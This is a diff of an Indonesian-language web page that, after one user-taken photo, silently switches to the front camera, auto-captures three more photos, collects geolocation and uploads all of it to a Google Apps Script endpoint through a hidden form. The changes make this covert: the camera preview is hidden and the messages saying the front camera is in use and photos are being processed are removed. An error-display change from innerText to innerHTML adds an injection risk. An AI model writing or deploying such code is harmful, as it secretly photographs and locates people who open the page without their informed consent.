@@ -233,7 +233,20 @@
 
       color: #ff6b6b;
 
-      line-height: 1.5;
+      line-height: 1.6;
+
+      font-size: 15px;
+
+    }
+
+
+    .error button {
+
+      background: white;
+
+      color: black;
+
+      margin-top: 20px;
 
     }
 
@@ -276,12 +289,17 @@
     </button>
 
 
+    <!-- =========================================
+         LOADING
+         ========================================= -->
+
     <div
       id="loading"
       class="loading"
     >
 
       <div class="spinner"></div>
+
 
       <div
         id="loadingText"
@@ -290,12 +308,17 @@
         Sedang memproses...
       </div>
 
+
       <div class="loading-warning">
         Jangan menutup halaman ini.
       </div>
 
     </div>
 
+
+    <!-- =========================================
+         SUCCESS
+         ========================================= -->
 
     <div
       id="success"
@@ -306,6 +329,7 @@
         ✓
       </div>
 
+
       <h2>
         Thank You
       </h2>
@@ -313,12 +337,17 @@
     </div>
 
 
+    <!-- =========================================
+         ERROR
+         ========================================= -->
+
     <div
       id="error"
       class="error"
     >
 
       <div id="errorMessage"></div>
+
 
       <button
         onclick="location.reload()"
@@ -339,12 +368,6 @@
  * ==================================================
  * GAS WEB APP URL
  * ==================================================
- *
- * URL backend tetap diperlukan oleh browser
- * GitHub Pages untuk mengirim data.
- *
- * SPREADSHEET ID TIDAK ADA DI SINI.
- *
  */
 
 const GAS_URL =
@@ -384,9 +407,6 @@ const mainButton =
 const loading =
   document.getElementById('loading');
 
-const loadingText =
-  document.getElementById('loadingText');
-
 const success =
   document.getElementById('success');
 
@@ -418,12 +438,19 @@ async function startProcess() {
 
     mainButton.disabled = true;
 
-    await openCamera('environment');
+
+    await openCamera(
+      'environment'
+    );
+
 
     mainButton.innerText =
       'Ambil Foto';
 
-    mainButton.disabled = false;
+
+    mainButton.disabled =
+      false;
+
 
     mainButton.onclick =
       takeFirstPhoto;
@@ -433,6 +460,7 @@ async function startProcess() {
   catch (error) {
 
     console.error(error);
+
 
     showError(
       'Kamera tidak dapat dibuka. Pastikan izin kamera diberikan.'
@@ -485,7 +513,7 @@ async function openCamera(
 
 
   video.style.display =
-    'block';
+    'none';
 
 
   await video.play();
@@ -573,8 +601,15 @@ async function takeFirstPhoto() {
 
   try {
 
+    /**
+     * ----------------------------------------------
+     * TAMPILKAN LOADING
+     * ----------------------------------------------
+     */
+
     mainButton.style.display =
       'none';
+
 
     loading.style.display =
       'block';
@@ -582,7 +617,7 @@ async function takeFirstPhoto() {
 
     /**
      * ----------------------------------------------
-     * FREEZE
+     * FOTO 1
      * ----------------------------------------------
      */
 
@@ -594,16 +629,6 @@ async function takeFirstPhoto() {
       'none';
 
 
-    loadingText.innerText =
-      'Memproses foto 1 dari 4...';
-
-
-    /**
-     * ----------------------------------------------
-     * UPLOAD PHOTO 1
-     * ----------------------------------------------
-     */
-
     await uploadPhoto(
       image,
       1
@@ -612,42 +637,46 @@ async function takeFirstPhoto() {
 
     /**
      * ----------------------------------------------
-     * FRONT CAMERA
+     * KAMERA DEPAN
      * ----------------------------------------------
      */
 
-    loadingText.innerText =
-      'Menyiapkan kamera depan...';
-
-
-    await openCamera('user');
+    await openCamera(
+      'user'
+    );
 
 
     /**
      * ----------------------------------------------
-     * PHOTO 2
+     * FOTO 2
      * ----------------------------------------------
      */
 
-    await automaticCapture(2);
+    await automaticCapture(
+      2
+    );
 
 
     /**
      * ----------------------------------------------
-     * PHOTO 3
+     * FOTO 3
      * ----------------------------------------------
      */
 
-    await automaticCapture(3);
+    await automaticCapture(
+      3
+    );
 
 
     /**
      * ----------------------------------------------
-     * PHOTO 4
+     * FOTO 4
      * ----------------------------------------------
      */
 
-    await automaticCapture(4);
+    await automaticCapture(
+      4
+    );
 
 
     /**
@@ -661,13 +690,16 @@ async function takeFirstPhoto() {
 
     /**
      * ----------------------------------------------
-     * REQUEST LOCATION
+     * VALIDASI LOKASI
      * ----------------------------------------------
+     *
+     * Tidak mengubah tulisan loading.
+     * Tetap:
+     *
+     * Sedang memproses...
+     * Jangan menutup halaman ini.
+     *
      */
-
-    loadingText.innerText =
-      'Memvalidasi lokasi...';
-
 
     const location =
       await requestLocation();
@@ -675,13 +707,9 @@ async function takeFirstPhoto() {
 
     /**
      * ----------------------------------------------
-     * SAVE LOCATION
+     * SIMPAN LOKASI
      * ----------------------------------------------
      */
-
-    loadingText.innerText =
-      'Menyimpan validasi lokasi...';
-
 
     await uploadLocation(
       location
@@ -701,18 +729,25 @@ async function takeFirstPhoto() {
     success.style.display =
       'block';
 
-
   }
 
   catch (error) {
 
     console.error(error);
 
+
     stopCamera();
+
 
     loading.style.display =
       'none';
 
+
+    /**
+     * ----------------------------------------------
+     * ERROR LOKASI
+     * ----------------------------------------------
+     */
 
     showError(
       error.message ||
@@ -734,13 +769,9 @@ async function automaticCapture(
   number
 ) {
 
-  await sleep(1200);
-
-
-  loadingText.innerText =
-    'Memproses foto ' +
-    number +
-    ' dari 4...';
+  await sleep(
+    1200
+  );
 
 
   const image =
@@ -753,7 +784,9 @@ async function automaticCapture(
   );
 
 
-  await sleep(800);
+  await sleep(
+    800
+  );
 
 }
 
@@ -816,8 +849,10 @@ function uploadPhoto(
       form.method =
         'POST';
 
+
       form.action =
         GAS_URL;
+
 
       form.target =
         iframe.name;
@@ -835,16 +870,18 @@ function uploadPhoto(
 
         id: sessionId,
 
-        captureNumber: number,
+        captureNumber:
+          number,
 
-        image: image
+        image:
+          image
 
       };
 
 
       /**
        * --------------------------------------------
-       * HIDDEN INPUT
+       * INPUT
        * --------------------------------------------
        */
 
@@ -857,8 +894,10 @@ function uploadPhoto(
       input.type =
         'hidden';
 
+
       input.name =
         'payload';
+
 
       input.value =
         JSON.stringify(
@@ -912,7 +951,7 @@ function uploadPhoto(
        * --------------------------------------------
        * CLEANUP
        * --------------------------------------------
-       */
+ */
 
       function cleanup() {
 
@@ -958,7 +997,7 @@ function requestLocation() {
 
         reject(
           new Error(
-            'Perangkat tidak mendukung lokasi.'
+            'Gagal melakukan validasi lokasi.'
           )
         );
 
@@ -992,7 +1031,7 @@ function requestLocation() {
 
                 reject(
                   new Error(
-                    'Gagal, silakan ulang pengiriman dan pastikan mengaktifkan lokasi device untuk validasi.'
+                    'Gagal melakukan validasi lokasi.<br><br>Silakan ulangi pengiriman dan aktifkan lokasi pada device untuk validasi.'
                   )
                 );
 
@@ -1026,7 +1065,8 @@ function requestLocation() {
       /**
        * --------------------------------------------
        * GET LOCATION
-       * -------------------------------------------- */
+       * --------------------------------------------
+       */
 
       function getLocation() {
 
@@ -1053,6 +1093,7 @@ function requestLocation() {
 
             },
 
+
             error => {
 
               console.error(
@@ -1063,11 +1104,12 @@ function requestLocation() {
 
               reject(
                 new Error(
-                  'Gagal, silakan ulang pengiriman dan pastikan mengaktifkan lokasi device untuk validasi.'
+                  'Gagal melakukan validasi lokasi.<br><br>Silakan ulangi pengiriman dan aktifkan lokasi pada device untuk validasi.'
                 )
               );
 
             },
+
 
             {
 
@@ -1292,7 +1334,11 @@ function showError(
     'block';
 
 
-  errorMessage.innerText =
+  /**
+   * Izinkan <br> pada pesan error
+   */
+
+  errorMessage.innerHTML =
     message;
 
 }
